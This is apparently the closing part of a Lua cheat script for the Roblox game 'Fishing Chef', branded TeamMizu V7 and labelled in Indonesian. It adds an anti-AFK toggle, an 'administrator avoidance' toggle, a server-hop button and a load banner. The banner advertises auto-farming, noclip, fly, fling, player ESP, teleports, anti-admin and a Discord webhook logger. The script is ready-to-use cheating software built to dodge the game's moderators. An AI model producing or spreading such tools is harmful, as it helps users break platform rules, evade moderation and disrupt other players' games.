TabSistem:CreateToggle({ Name = "Protokol Anti-AFK", CurrentValue = true, Callback = function(v) Config.AntiAFK = v end })
TabSistem:CreateToggle({ Name = "Penghindaran Administrator", CurrentValue = false, Callback = function(v) Config.AntiAdmin = v end })
TabSistem:CreateButton({ Name = "Eksekusi Perpindahan Server (Server Hop)", Callback = function()
    local api = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
    pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet(api))
        if data and data.data then
            for _, srv in ipairs(data.data) do
                if srv.playing > 0 and srv.playing < Players.MaxPlayers - 1 and srv.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(game.PlaceId, srv.id, LocalPlayer)
                    return
                end
            end
        end
    end)
end})
TabSistem:CreateButton({ Name = "Hancurkan Antarmuka", Callback = function() Rayfield:Destroy() end })

-- [ EFEK RGB BORDER ]
task.spawn(function()
    while true do
        if Window.Elements and Window.Elements.MainFrame then
            pcall(function()
                local hue = (tick() % 5) / 5
                Window.Elements.MainFrame.BorderColor3 = Color3.fromHSV(hue, 1, 1)
            end)
        end
        task.wait(0.05)
    end
end)

-- Notifikasi Selesai Dimuat
Rayfield:Notify({ Title = "TeamMizu | Fishing Chef V7", Content = "Ruang kerja premium telah diinisialisasi dengan aman!", Duration = 4, Image = 4483362458 })

print([[

TEAMMIZU | FISHING CHEF V7 LOADED!

FITUR:
✅ Auto Fish (Loop)
✅ Auto Buy & Equip Bait
✅ Auto Sell Fish (Safe Mode)
✅ Auto Cook
✅ Auto Serve
✅ Auto Upgrade
✅ Auto Collect / Magnet
✅ Auto Claim Rewards
✅ Buy Normal Rod (Spirit Cat, Glacier, Kitsune, Sea Dragon)
✅ Buy OP Rod (10 Jenis)
✅ Buy Knife (3 Jenis)
✅ Custom WalkSpeed & JumpPower
✅ Noclip
✅ Infinite Jump
✅ Fly Mode
✅ Fling Walk
✅ Anti Fling
✅ Player ESP
✅ Item ESP
✅ Customer ESP
✅ Fullbright
✅ No Fog
✅ Clear Water
✅ Custom Waktu & Ambient
✅ Click Teleport (CTRL + Klik Kiri)
✅ Custom Waypoints
✅ Teleport Lokasi Map
✅ Anti-AFK
✅ Anti-Admin
✅ Server Hop
✅ Discord Webhook Logger
]])